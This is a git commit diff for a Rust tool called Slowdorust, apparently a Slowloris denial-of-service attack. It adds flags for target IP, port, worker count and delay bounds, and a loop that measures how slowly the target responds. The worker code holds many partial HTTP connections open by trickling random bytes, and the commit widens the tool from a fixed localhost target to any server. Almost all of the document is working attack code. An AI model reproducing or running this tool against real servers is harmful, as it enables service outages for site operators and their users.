21569177e148cac351119d930e1fcd6c00c3e2d0
Michael Van Leeuwen <michaeljvanleeuwen@gmail.com>
2021-11-02 22:35:07 -0400

    Add additional flags and benchmarking

--- src/main.rs
+++ src/main.rs
@@ -1,47 +1,90 @@
 mod worker;
 
-use scoped_threadpool::Pool;
-use worker::Worker;
-use std::net::TcpStream;
 use clap::Parser;
+use scoped_threadpool::Pool;
+use std::io::Error;
+use std::net::TcpStream;
+use std::thread::sleep;
+use std::time::{Duration, Instant};
+use worker::Worker;
 
 #[derive(Parser)]
-#[clap(version = "1.0", author = "Michael V. <michaeljvanleeuwen@gmail.com>")]
-struct Slowdoris {
+#[clap(
+    version = "1.0",
+    author = "Michael Van Leeuwen <michaeljvanleeuwen@gmail.com>"
+)]
+struct Slowdorust {
     /// The IP address of the webserver
     ip: String,
     /// The port the webserver is running on
     port: String,
-    /// How worker sockets to open
+    /// How many worker sockets to open
+    #[clap(short, long, default_value = "50")]
     num_workers: u8,
-    /// Lower bound of request delay
-    sleep_min: u8,
-    /// Maximum bound of request delay
-    sleep_max: u8,
+    /// Lower bound of request delay in seconds
+    #[clap(short, long, default_value = "0")]
+    lower_sleep: u8,
+    /// Upper bound of request delay in seconds
+    #[clap(short, long, default_value = "15")]
+    upper_sleep: u8,
+    /// How many seconds to wait between each connection benchmark
+    #[clap(short, long, default_value = "15")]
+    benchmark_delay: u8,
+    /// Log actions of each worker
+    #[clap(short, long, parse(from_occurrences))]
+    verbose: i32,
+}
+
+fn benchmark_connection(ip: &String, port: &String) -> Result<Duration, Error> {
+    let now = Instant::now();
+    TcpStream::connect(format!("{}:{}", ip, port))?;
+    Ok(now.elapsed())
 }
 
 fn main() {
-    let args = Slowdoris::parse();
+    let args = Slowdorust::parse();
 
-    if args.sleep_min >= args.sleep_max {
-        panic!("sleep_min must be < sleep_max")
+    if args.lower_sleep >= args.upper_sleep {
+        panic!("Error: sleep_min must be < sleep_max.")
     }
 
-    if TcpStream::connect(format!("{}:{}", args.ip, args.port)).is_err() {
+    if benchmark_connection(&args.ip, &args.port).is_err() {
         panic!("Connection failed. Is the server up?");
     }
 
+    println!("Starting workers...");
     let mut pool = Pool::new(args.num_workers as u32);
     let mut num_workers = 0;
     pool.scoped(|scoped| {
         while num_workers < args.num_workers {
-            if let Ok(mut worker) = Worker::new(num_workers, (args.sleep_min, args.sleep_max)) {
-                println!("[slowloris_{:02}] Spawned.", num_workers);
+            if let Ok(mut worker) = Worker::new(
+                num_workers,
+                &args.ip,
+                &args.port,
+                (args.lower_sleep, args.upper_sleep),
+                args.verbose,
+            ) {
+                if args.verbose > 0 {
+                    println!("[slowloris_{:02}] Spawned.", num_workers);
+                }
                 scoped.execute(move || {
                     worker.start();
                 });
                 num_workers += 1;
             }
+            if num_workers % (args.num_workers / 10 + 1) == 0 {
+                println!("\t{:02} workers spawned.", num_workers);
+            }
+        }
+        println!("All workers spawned!");
+
+        println!("Starting connection benchmarking...");
+        loop {
+            match benchmark_connection(&args.ip, &args.port) {
+                Ok(dur) => println!("\tConnected in {}s ({} ns).", dur.as_secs(), dur.as_nanos()),
+                Err(_) => println!("\tFailed to connect.")
+            }
+            sleep(Duration::from_secs(args.benchmark_delay as u64));
         }
     });
 }
--- src/worker.rs
+++ src/worker.rs
@@ -8,17 +8,25 @@ use std::time::Duration;
 pub struct Worker {
     id: u8,
     sleep_bounds: (u8, u8),
+    verbose: i32,
     stream: TcpStream,
 }
 
 impl Worker {
-    pub fn new(id: u8, sleep_bounds: (u8, u8)) -> Result<Worker, Error> {
-        let mut stream = TcpStream::connect("127.0.0.1:80")?;
-        stream.write_all("GET / HTTP/1.1\r\nUser-Agent: slowloris\r\n".as_bytes())?;
+    pub fn new(
+        id: u8,
+        ip: &String,
+        port: &String,
+        sleep_bounds: (u8, u8),
+        verbose: i32,
+    ) -> Result<Worker, Error> {
+        let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
+        stream.write_all("GET / HTTP/1.1\r\n".as_bytes())?;
 
         Ok(Worker {
             id,
             sleep_bounds,
+            verbose,
             stream,
         })
     }
@@ -27,10 +35,18 @@ impl Worker {
         let mut rng = SmallRng::from_entropy();
 
         loop {
-            thread::sleep(Duration::from_secs(rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64));
+            thread::sleep(Duration::from_secs(
+                rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64,
+            ));
             match &self.stream.write_all(&rng.gen::<[u8; 1]>()) {
-                Ok(_) => println!("[slowloris_{:02}] Update sent.", self.id),
-                Err(_) => println!("[slowloris_{:02}] Update failed.", self.id),
+                Ok(_) if (*&self.verbose > 0) => {
+                    println!("[slowloris_{:02}] Update sent.", self.id)
+                }
+                _ => {
+                    if *&self.verbose > 0 {
+                        println!("[slowloris_{:02}] Update failed.", self.id);
+                    }
+                }
             }
         }
     }
